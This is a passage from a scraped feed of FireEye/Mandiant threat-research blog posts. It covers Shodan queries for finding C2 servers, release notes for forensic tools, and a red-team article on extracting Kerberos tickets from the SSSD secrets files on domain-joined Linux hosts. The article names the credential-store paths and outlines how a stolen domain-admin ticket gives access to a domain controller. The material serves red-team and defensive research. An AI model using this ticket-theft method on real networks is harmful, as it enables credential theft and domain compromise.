<i>FIN6</i></p> \n<p>In early 2019, SCANdalous identified a Cobalt Strike C2 server that we were able to associate with FIN6. Four hours later, the server was used to target a Managed Defense client, as discussed in our blog post,&nbsp;<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\">Pick-Six: Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware</a>.</p> \n<p> <i>FIN7</i></p> \n<p>In late 2019, SCANdalous identified a BOOSTWRITE C2 server and automatically acquired keying material that was later used to decrypt files found in a FIN7 intrusion worked by Mandiant consultants, as discussed in our blog post,&nbsp;<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html\">Mahalo FIN7: Responding to the Criminal Operators’ New Tools and Techniques</a>.</p> \n<p> <i>UNC1878 (financially motivated)</i></p> \n<p>Some of you may also remember our <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/03/the-cycle-of-adversary-pursuit.html\">recent blog post on UNC1878</a>. It serves as a great case study for how we grow an initial observation into a larger set of data, and then use that knowledge to find more activity across our offerings. Much of the early work that went into tracking that activity (see the section titled “Expansion”) happened via SCANdalous. The quick response from Managed Defense gave us just enough information to build a profile of the C2 and let our automated system take it from there. Over the next couple months, SCANdalous identified numerous servers matching UNC1878’s profile. This allowed us to not only analyze and attribute new network infrastructure, it also helped us observe when and how they were changing their operations over time.</p> \n<h4>Conclusion</h4> \n<p>There are hundreds more stories to tell, but the point is the same. When we find value in an analytical workflow, we ask ourselves how we can do it better and faster. The automation we build into our tools allows us to not only accomplish more of the work we were doing manually, it enables us to work on things we never could before. Of course, the conversion doesn’t happen all at once. Like all good things, we made a lot of incremental improvements over time to get where we are today, and we’re still finding ways to make more. Continuing to innovate is how we keep moving forward – as Advanced Practices, as FireEye, and as an industry.</p> \n<h4>Example Signatures</h4> \n<p>The following are example Shodan queries; however, any source of scan data can be used.</p> \n<p> <b>Used to Identify APT39 C2 Servers</b></p> \n<ul> \n <li> <span class=\"code\">product:“bitvise” port:“443” org:“WorldStream B.V.”</span></li> \n</ul> \n<p> <b>Used to Identify QUADAGENT C2 Servers</b></p> \n<ul> \n <li> <span class=\"code\">“PHP/7.2.0beta2”</span></li> \n</ul> \n<p> <b>RULER.HOMEPAGE Payloads</b></p> \n<ul> \n <li> <span class=\"code\">html:“clsid:0006F063-0000-0000-C000-000000000046”</span></li> \n</ul>","descriptionType":"html","publishedDate":"Mon, 13 Jul 2020 18:30:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture1.png","linkMd5":"ebbd6b95ce31265830e4525f9b1c57b3","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn75@2020_3/2020/08/24/14-11-05-526_26e1b25ff50cf2cc.webp","destWidth":1362,"destHeight":850,"sourceBytes":325500,"destBytes":93366,"author":"Aaron Stephens","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn75@2020_3/2020/08/24/14-11-05-526_26e1b25ff50cf2cc.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture2a.jpg":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn16@2020_6/2020/08/24/14-11-21-237_ea12739d405033fe.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn27@2020_3/2020/08/24/14-11-19-015_5f0209009de802d5.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn89@2020_6/2020/08/24/14-11-19-151_11814fdd48935a66.webp"},"publishedOrCreatedDate":1598278264205},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Highlighter v1.1.2 Released","link":"http://www.fireeye.com/blog/threat-research/2011/02/highlighter-v112-released.html","description":"<div class=\"c00 c00v1\"> \n <p>Hey, guess what?! MANDIANT has just released Highlighter v1.1.2 in response to your feedback - a fix for one particularly nagging issue with highlights and removals not updating the view immediately, and a few extra items thrown in to make Highlighter a little nicer to use.</p> \n <p>Wipe the cheesy poofs off your fingers and go <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/highlighter.html\">here</a> to the download page to check out the updates.</p> \n <p>We have listened to your suggestions on how to improve this tool and have worked hard to make it a prime source for rapid review of logs and other structured text files.</p> \n <blockquote>\n  New Feature:\n  <ul> \n   <li>Ability to change the display font. (Look in the menu under File -&gt; Font.)</li> \n  </ul> \n  <p>Improvements:</p> \n  <ul> \n   <li>Selecting text in the display will now more accurately line up with the mouse pointer.</li> \n   <li>The display will now remain at the same point in the file after removing or restoring lines.</li> \n  </ul> \n  <p>Fixes:</p> \n  <ul> \n   <li>Display refresh issues in Windows 7.</li> \n   <li>In some cases, state files did not properly store and restore state.</li> \n  </ul> \n </blockquote> \n</div>","descriptionType":"html","publishedDate":"Tue, 08 Feb 2011 02:00:34 +0000","feedId":1226,"bgimg":"","linkMd5":"207b0247afb5cdca5ce12511eb92109f","bgimgJsdelivr":"","metaImg":"","author":"Jed Mitten","publishedOrCreatedDate":1598278264215},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Kerberos Tickets on Linux Red Teams","link":"http://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html","description":"<p>At <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">FireEye Mandiant</a>, we conduct numerous red team engagements within Windows Active Directory environments. Consequently, we frequently encounter Linux systems integrated within Active Directory environments. Compromising an individual domain-joined Linux system can provide useful data on its own, but the best value is obtaining data, such as Kerberos tickets, that will facilitate lateral movement techniques. By passing these Kerberos Tickets from a Linux system, it is possible to move laterally from a compromised Linux system to the rest of the Active Directory domain.</p> \n<p>There are several ways to configure a Linux system to store Kerberos tickets. In this blog post, we will introduce Kerberos and cover some of the various storage solutions. We will also introduce a new tool that extracts Kerberos tickets from domain-joined systems that utilize the System Security Services Daemon Kerberos Cache Manager (SSSD KCM).</p> \n<h4>What is Kerberos</h4> \n<p>Kerberos is a standardized authentication protocol that was originally created by MIT in the 1980s. The protocol has evolved over time. Today, Kerberos Version 5 is implemented by numerous products, including Microsoft Active Directory.&nbsp;Kerberos was originally designed to mutually authenticate identities over an unsecured communication line.</p> \n<p>The Microsoft implementation of Kerberos is used in Active Directory environments to securely authenticate users to various services, such as the domain (LDAP), database servers (MSSQL) and file shares (SMB/CIFS). While other authentication protocols exist within Active Directory, Kerberos is one of the most popular methods. Technical documentation on how Microsoft implemented Kerberos Protocol Extensions within Active Directory can be found in the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9\">MS-KILE standards</a> published on MSDN.&nbsp;</p> \n<h4>Short Example of Kerberos Authentication in Active Directory</h4> \n<p>To illustrate how Kerberos works, we have selected a common scenario where a user John Smith with the account ACMENET.CORP\\sa_jsmith wishes to authenticate to a Windows SMB (CIFS) file share in the Acme Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP.</p> \n<p>There are two main types of Kerberos tickets used in Active Directory: Ticket Granting Ticket (TGT) and service tickets. Service tickets are obtained from the Ticket Granting Service (TGS). The TGT is used to authenticate the identity of a particular entity in Active Directory, such as a user account. Service tickets are used to authenticate a user to a specific service hosted on a system. A valid TGT can be used to request service tickets from the Key Distribution Center (KDC). In Active Directory environments, the KDC is hosted on a Domain Controller.</p> \n<p>The diagram in Figure 1 shows the authentication flow.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture1.png\" alt=\"\" /></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 1: Example Kerberos authentication flow</span></p> \n<p>In summary:</p> \n<ol> \n <li>The user requests a Ticket Granting Ticket (TGT) from the Domain Controller.</li> \n <li>Once granted, the user passes the TGT back to the Domain Controller and requests a service ticket for cifs/SQLSERVER.ACMENET.CORP.</li> \n <li>After the Domain Controller validates the request, a service ticket is issued that will authenticate the user to the CIFS (SMB) service on SQLSERVER.ACMENET.CORP.</li> \n <li>The user receives the service ticket from the Domain Controller and initiates an SMB negotiation with SQLSERVER.ACMENET.CORP. During the authentication process, the user provides a Kerberos blob inside an “AP-REQ” structure that includes the service ticket previously obtained.</li> \n <li>The server validates the service ticket and authenticates the user.</li> \n <li>If the server determines that the user has permissions to access the share, the user can begin making SMB queries.</li> \n</ol> \n<p>For an in-depth example of how Kerberos authentication works, scroll down to view the appendix at the bottom of this article.</p> \n<h4>Kerberos On Linux Domain-Joined Systems</h4> \n<p>When a Linux system is joined to an Active Directory domain, it also needs to use Kerberos tickets to access services on the Windows Active Directory domain. Linux uses a different Kerberos implementation. Instead of Windows formatted tickets (commonly referred to as the KIRBI format), Linux uses MIT format Kerberos Credential Caches (CCACHE files).&nbsp;</p> \n<p>When a user on a Linux system wants to access a remote service with Kerberos, such as a file share, the same procedure is used to request the TGT and corresponding service ticket. In older, more traditional implementations, Linux systems often stored credential cache files in the /tmp directory. Although the files are locked down and not world-readable, a malicious user with root access to the Linux system could trivially obtain a copy of the Kerberos tickets and reuse them.</p> \n<p>On modern versions of Red Hat Enterprise Linux and derivative distributions, the System Security Services Daemon (SSSD) is used to manage Kerberos tickets on domain-joined systems. SSSD implements its own form of Kerberos Cache Manager (KCM) and encrypts tickets within a database on the system. When a user needs access to a TGT or service ticket, the ticket is retrieved from the database, decrypted, and then passed to the remote service (for more on SSSD, check out this <a href=\"https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/#more-6806\">great research from Portcullis Labs</a>).</p> \n<p>By default, SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb. The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey. By default, the key is only readable if you have root permissions.</p> \n<p>If a user is able to extract both of these files, it is possible to decrypt the files offline and obtain valid Kerberos tickets. We have published a new tool called <a href=\"https://github.com/fireeye/SSSDKCMExtractor\">SSSDKCMExtractor</a> that will decrypt relevant secrets in the SSSD database and pull out &nbsp;the credential cache Kerberos blob. This blob can be converted into a usable Kerberos CCache file that can be passed to other tools, such as <a href=\"https://github.com/gentilkiwi/mimikatz\">Mimikatz</a>, <a href=\"https://github.com/SecureAuthCorp/impacket\">Impacket</a>, and <a href=\"https://www.samba.org/samba/docs/current/man-html/smbclient.1.html\">smbclient</a>. CCache files can be converted into Windows format using tools such as <a href=\"https://github.com/gentilkiwi/kekeo\">Kekeo</a>.</p> \n<p>We leave it as an exercise to the reader to convert the decrypted Kerberos blob into a usable credential cache file for pass-the-cache and pass-the-ticket operations.</p> \n<p>Using SSSDKCMExtractor is simple. An example SSSD KCM database and key are shown in Figure 2.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: SSSD KCM files</span></p> \n<p>Invoking SSSDKCMExtractor with the --database and --key parameters will parse the database and decrypt the secrets as shown in Figure 3.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: Extracting Kerberos data</span></p> \n<p>After manipulating the data retrieved, it is possible to use the CCACHE in smbclient as shown in Figure 4. In this example, a domain administrator ticket was obtained and used to access the domain controller’s C$ share.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: Compromising domain controller with extracted tickets</span></p> \n<p>The <a href=\"https://github.com/fireeye/SSSDKCMExtractor\">Python script and instructions</a> can be found on the FireEye Github.</p> \n<h4>Conclusion</h4> \n<p>By obtaining privileged access to a domain-joined Linux system, it is often possible to scrape Kerberos tickets useful for lateral movement. Although it is still common to find these tickets in the /tmp directory, it is now possible to also scrape these tickets from modern Linux systems that utilize the SSSD KCM.</p> \n<p>With the right Kerberos tickets, it is possible to move laterally to the rest of the Active Directory domain. If a privileged user authenticates to a compromised Linux system (such as a Domain Admin) and leaves a ticket behind, it would be possible to steal that user's ticket and obtain privileged rights in the Active Directory domain.</p> \n<h4>Appendix: Detailed Example of Kerberos Authentication in Active Directory</h4> \n<p>To illustrate how Kerberos works, we have selected a common scenario where a user John Smith with the account ACMENET.CORP\\sa_jsmith wishes to authenticate to a Windows SMB (CIFS) file share in the Acme Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP.</p> \n<p>There are two main types of Kerberos ticket types used in Active Directory: Ticket Granting Ticket (TGT) and service tickets. Service tickets are obtained from the Ticket Granting Service (TGS). The TGT is used to authenticate the identity of a particular entity in Active Directory, such as a user account. Service tickets are used to authenticate a user to a specific service hosted on a domain- joined system. A valid TGT can be used to request service tickets from the Key Distribution Center (KDC). In Active Directory environments, the KDC is hosted on a Domain Controller.</p> \n<p>When the user wants to authenticate to the remote file share, Windows first checks if a valid TGT is present in memory on the user's workstation. If a TGT isn't present, a new TGT is requested from the Domain Controller in the form of an AS-REQ request. To prevent password cracking attacks (<a href=\"https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/\">AS-REP Roasting</a>), by default, Kerberos Preauthentication is performed first. Windows creates a timestamp and encrypts the timestamp with the user's Kerberos key (Note: User Kerberos keys vary based on encryption type. In the case of RC4 encryption, the user's RC4 Kerberos key is directly derived from the user's account password. In the case of AES encryption, the user's Kerberos key is derived from the user's password and a salt based on the username and domain name). The domain controller receives the request and decrypts the timestamp by looking up the user's Kerberos key. An example AS-REQ packet is shown in Figure 5.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture5.png\" alt=\"\" /></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 5: AS-REQ</span></p> \n<p>Once preauthentication is successful, the Domain Controller issues an AS-REP response packet that contains various metadata fields, the TGT itself, and an \"Authenticator\". The data within the TGT itself is considered sensitive. If a user could freely modify the content within the TGT, they could <a href=\"https://adsecurity.org/?p=1515\">impersonate any user in the domain</a>&nbsp;as performed in the Golden Ticket attack. To prevent this from easily occurring, the TGT is encrypted with the long term Kerberos key stored on the Domain Controller. This key is derived from the password of the krbtgt account in Active Directory.</p> \n<p>To prevent users from impersonating another user with a stolen TGT blob, Active Directory’s Kerberos implementation uses session keys that are used for mutual authentication between the user, domain, and service. When the TGT is requested, the Domain Controller generates a session key and places it in two places: the TGT itself (which is encrypted with the krbtgt key and unreadable by the end user), and in a separate structure called the Authenticator. The Domain Controller encrypts the Authenticator with the user's personal Kerberos key.</p> \n<p>When Windows receives the AS-REP packet back from the domain controller, it caches the TGT ticket data itself into memory. It also decrypts the Authenticator with the user's Kerberos key and obtains a copy of the session key generated by the Domain Controller. Windows stores this session key in memory for future use. At this point, the user's system has a valid TGT that it can use to request service tickets from the domain controller. An example AS-REP packet is shown in Figure 6.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture6.png\" alt=\"\" /></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 6: AS-REP</span></p> \n<p>After obtaining a valid TGT for the user, Windows requests a service ticket for the file share service hosted on the remote system SQLSERVER.ACMENET.CORP. The request is made using the service's Service Principal Name (“SPN”). In this case, the SPN would be cifs/SQLSERVER.ACMENET.CORP. Windows builds the service ticket request in a TGS-REQ packet. Within the TGS-REQ packet, Windows places a copy of the TGT previously obtained from the Domain Controller. This time, the Authenticator is encrypted with the TGT session key previously obtained from the domain controller. An example TGS-REQ packet is shown in Figure 7.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture7.png\" alt=\"\" /></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 7: TGS-REQ</span></p> \n<p>Once the Domain Controller receives the TGS-REQ packet, it extracts the TGT from the request and decrypts it with the krbtgt Kerberos key. The Domain Controller verifies that the TGT is valid and extracts the session key field from the TGT. The Domain Controller then attempts to decrypt the Authenticator in the TGS-REQ packet with the session key. Once decrypted, the Domain Controller examines the Authenticator and verifies the contents. If this operation succeeds, the user is considered authenticated by the Domain Controller and the requested service ticket is created.</p> \n<p>The Domain Controller generates the service ticket requested for cifs/SQLSERVER.ACMENET.CORP. The data within the service ticket is also considered sensitive. If a user could manipulate the service ticket data, they could <a href=\"https://adsecurity.org/?p=1515\">impersonate any user on the domain to the service</a>&nbsp;as performed in the Silver Ticket attack. To prevent this from easily happening, the Domain Controller encrypts the service ticket with the Kerberos key of the computer the user is authenticating to. All domain-joined computers in Active Directory possess a randomly generated computer account credential that both the computer and Domain Controller are aware of. The Domain Controller also generates a second session key specific to the service ticket and places a copy in both the encrypted service ticket and a new Authenticator structure. This Authenticator is encrypted with the first session key (the TGT session key). The service ticket, Authenticator, and metadata are bundled in a TGS-REP packet and forwarded back to the user. An example TGS-REP packet is shown in Figure 8.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture8.png\" alt=\"\" /></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 8: TGS-REP</span></p> \n<p>Once Windows receives the TGS-REP for cifs/SQLSERVER.ACMENET.CORP, Windows extracts the service ticket from the packet and caches it into memory. It also decrypts the Authenticator with the TGT specific session key to obtain the new service specific session key. Using both pieces of information, it is now possible for the user to authenticate to the remote file share. Windows negotiates a SMB connection with SQLSERVER.ACMENET.CORP. It places a Kerberos blob in an \"ap-req\" structure. This Kerberos blob includes the service ticket received from the domain controller, a new Authenticator structure, and metadata. The new Authenticator is encrypted with the service specific session key that was previously obtained from the Domain Controller.&nbsp;The authentication process is shown in Figure 9.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture9.png\" alt=\"\" /></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 9: Authenticating to SMB (AP-REQ)</span></p> \n<p>Once the file share server receives the authentication request, it first extracts and decrypts the service ticket from the Kerberos authentication blob and verifies the data within. It also extracts the service specific session key from the service ticket and attempts to decrypt the Authenticator with it. If this operation succeeds, the user is considered to be authenticated to the service. The server will acknowledge the successful authentication by sending one final Authenticator back to the user, encrypted with the service specific session key. This action completes the mutual authentication process. The response (contained within an “ap-rep” structure) is shown in Figure 10.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture10.png\" alt=\"\" /></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 10: Final Authenticator (Mutual Authentication, AP-REP)</span></p> \n<p>A diagram of the authentication flow is shown in Figure 11.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture11.png\" alt=\"\" /></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 11: Example Kerberos authentication flow</span></p>","descriptionType":"html","publishedDate":"Wed, 01 Apr 2020 16:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture1.png","linkMd5":"763d34f4bd9d31262283be3aa5eebb53","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn56@2020_1/2020/08/24/14-11-05-304_7edf3fdd30778d6b.webp","destWidth":1037,"destHeight":664,"sourceBytes":366067,"destBytes":47096,"author":"Trevor Haskell","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn56@2020_1/2020/08/24/14-11-05-304_7edf3fdd30778d6b.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn57@2020_1/2020/08/24/14-11-09-580_c9e8e2444df15614.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn87@2020_1/2020/08/24/14-11-09-076_2919aad7e47686ca.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn48@2020_3/2020/08/24/14-11-12-317_c6b7352ceb39ef67.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn55@2020_2/2020/08/24/14-11-11-235_51cd719adbc06b8c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn89@2020_6/2020/08/24/14-11-14-797_b0bb8bfbec144dde.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture7.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn85@2020_4/2020/08/24/14-11-14-085_a5db0a5ba58599d3.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture8.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn88@2020_3/2020/08/24/14-11-15-937_ccc2d706578a073b.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture9.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn9@2020_2/2020/08/24/14-11-14-771_b3ee1b387db64c1f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture10.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn39@2020_6/2020/08/24/14-11-18-331_dbfb2eade78f065b.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture11.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn39@2020_3/2020/08/24/14-11-10-647_0928712bccdff7dc.webp"},"publishedOrCreatedDate":1598278264185},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"New Open Source Tool: Audit Parser","link":"http://www.fireeye.com/blog/threat-research/2012/07/freeware-tool-audit-parser-tm.html","description":"<div class=\"c00 c00v1\"> \n <p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Mandiant Redline<sup>TM</sup></a> and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-finder.html\">IOC Finder<sup> TM</sup></a> collect and parse a huge body of evidence from a running system. In fact, they're based on the same agent software as our flagship <a href=\"http://www.mandiant.com/products/platform/\">Mandiant Intelligent Response®</a> product. During the course of their \"audits\", these tools conduct comprehensive analysis of the file system (including hashing, time stamps, parsing of PE file structures, and digital signature checks), registry hives, processes in memory, event logs, active network connections,DNS cache contents,web browser history, system restore points, scheduled tasks, prefetch entries, persistence mechanisms, and much more.</p> \n <p>Once this data is collected, Redline and IOCFinder currently allow you to do one of two things:</p> \n <ul> \n  <li>Review the contents of memory through a visual workflow in Redline</li> \n  <li>Search for Indicators of Compromise (IOCs) and generate a report of \"hits\"</li> \n </ul> \n <p>But what if you want to analyze all of the raw evidence - not just memory or IOC hits - and do traditional forensics and timeline analysis? That's where <a href=\"https://github.com/mandiant/AuditParser\">Audit Parser</a> steps in. It's the newest addition to Mandiant's portfolio of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware.html\">free software</a>.</p> \n <p>Audit Parser is simple:it takes the complex XML data produced by Redline or IOCFinder and converts it into human-readable tab-delimited text. You can then easily review the output in Excel, use a dedicated CSV file viewer (we're fans of \"CSVed\" and\"CSVFileView\"), import it into a database, or grep / manipulate it to your heart's content.</p> \n <p>When paired with Redline's new start-up workflow to build a \"collector\" script, Audit Parser gives you a complete(and free)live response analysis toolkit. You can customize the Redline collector to gather as much or as little evidence as desired, run it on your target system, and then easily review all of the results following a quick conversion with Audit Parser.</p> \n <p>The screen capture below shows Audit Parser's options - it's pretty straightforward to use:</p> \n <p> <b> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab01.jpg\"><img width=\"801\" height=\"268\" class=\"alignnone size-full wp-image-3010\" title=\"auditparser-screengrab0\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab01.jpg\" /></a></b></p> \n <p>Tabular data in Excel doesn't make for the most exciting screen shots, but we wanted to give you a glimpse into what the output looks like and the extent of evidence available for filtering, sorting, and analysis:</p> \n <ul> \n  <li>A filtered view of a file system audit, showing complete file metadata for all PE files within %SYSTEMROOT% created between 2011-2012 that are not digitally signed.</li> \n </ul> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab12.jpg\"><img width=\"1024\" height=\"254\" class=\"alignnone size-large wp-image-3014\" title=\"auditparser-screengrab1\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab12-1024x254.jpg\" /></a></p> \n <ul> \n  <li>A portion of a prefetch audit, showing how the contents of .PF files are automatically parsed to provide last time executed, # of times executed, and original file path metadata.</li> \n </ul> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab2.jpg\"><img width=\"1024\" height=\"282\" class=\"alignnone size-large wp-image-3015\" title=\"auditparser-screengrab2\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab2-1024x282.jpg\" /></a></p> \n <ul> \n  <li>A portion of a full registry dump, showing review of Active Setup Installed Components registry keys - the data includes all key value / data pairs and last modified dates.</li> \n </ul> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab3.jpg\"><img width=\"1024\" height=\"165\" class=\"alignnone size-large wp-image-3016\" title=\"auditparser-screengrab3\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab3-1024x165.jpg\" /></a></p> \n <ul> \n  <li>A portion of the parsed Windows event logs, showing review of process auditing events including event log source, time generated, event ID, and full event message contents.</li> \n </ul> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab4.jpg\"><img width=\"1024\" height=\"496\" class=\"alignnone size-large wp-image-3017\" title=\"auditparser-screengrab4\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab4-1024x496.jpg\" /></a></p> \n <p>The default \"comprehensive collector\" script in Redline collects all of the artifacts listed above, as well as many more.</p> \n <p>But wait - that's not all! Audit Parser also contains timeline generation functionality. Just specify a time &amp; date range, and it will build a sorted timeline of all file system, registry, and event log events that occurred within that period. Future releases will add more audit types and customizability to this feature.</p> \n <p>Audit Parser is written in Python and is distributed under the Apache License. It requires the lxml (<a href=\"http://lxml.de/\">http://lxml.de/</a>) library. We're also distributing a Windows EXE built with Py2EXE for users that may not have a Python environment set up. You can download the tool and documentation on GitHub at: <a href=\"https://github.com/mandiant/AuditParser\">https://github.com/mandiant/AuditParser</a></p> \n <p>If you have any questions or comments, feel free to leave them below, e-mail me (ryan [dot] kazanciyan [at] mandiant.com), or DM me on Twitter at <a title=\"Twitter\" href=\"https://twitter.com/ryankaz42\" target=\"_blank\">@ryankaz42</a>. I'll also be at Black Hat USA next week teaching <a href=\"http://blackhat.com/html/bh-us-12/training/courses/bh-us-12-training_md-ir.html\">Mandiant's Incident Response course</a> where we'll be going through an in-depth live response analysis lab using Redline, Audit Parser, and other forensic tools. I was on a recent M-Unition podcast discussing the class and how it is completely revamped for 2012. You can listen to the podcast <a title=\"M-Unition Podcast\" href=\"https://blog.mandiant.com/archives/2942\" target=\"_blank\">here</a>. Hope to see you there!</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 19 Jul 2012 20:20:19 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab01.jpg","linkMd5":"b84b37c3e9f54bfc31e53c4e61376e0e","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn91@2020_4/2020/08/24/14-11-05-060_abc0f110eb4af9d7.webp","destWidth":801,"destHeight":268,"sourceBytes":45928,"destBytes":31248,"author":"Ryan 